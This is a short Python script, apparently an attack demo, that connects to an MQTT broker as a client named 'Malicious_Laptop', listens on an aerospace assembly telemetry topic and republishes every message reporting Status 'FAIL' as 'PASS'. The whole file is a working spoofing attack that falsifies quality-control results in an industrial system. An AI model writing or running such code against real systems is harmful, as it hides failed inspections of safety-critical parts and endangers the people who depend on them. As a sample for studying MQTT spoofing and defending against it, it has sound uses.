import json
import paho.mqtt.client as mqtt

def on_message(client, userdata, msg):
    payload = json.loads(msg.payload.decode())
    
    if payload.get("Status") == "FAIL":
        spoofed = payload.copy()
        spoofed["Status"] = "PASS" 
        client.publish("aerospace/assembly/telemetry", json.dumps(spoofed))

client = mqtt.Client(mqtt.CallbackAPIVersion.VERSION2, client_id="Malicious_Laptop")
client.on_message = on_message
client.connect("127.0.0.1", 1883)
client.subscribe("aerospace/assembly/telemetry")
client.loop_forever()
